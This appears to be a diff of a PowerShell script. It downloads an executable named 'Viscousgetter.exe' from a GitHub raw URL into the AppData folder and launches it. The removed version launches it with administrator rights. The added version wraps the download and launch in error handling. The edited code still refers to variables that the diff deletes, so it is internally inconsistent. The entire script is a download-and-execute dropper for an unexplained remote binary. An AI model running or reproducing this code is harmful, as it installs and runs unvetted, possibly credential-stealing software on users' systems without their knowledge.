@@ -1,5 +1,7 @@
-$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
-$VISPath = "$env:AppData\Viscousgetter.exe"
-Invoke-WebRequest -Uri $VIS -OutFile $VISPath
-Start-Process -FilePath $VISPath -Verb RunAs
-
+try {
+    Invoke-WebRequest -Uri $VIS -OutFile $VISPath
+    Start-Sleep -Seconds 5
+    Start-Process -FilePath $VISPath -ErrorAction Stop
+} catch {
+    Write-Error $_.Exception.Message
+}
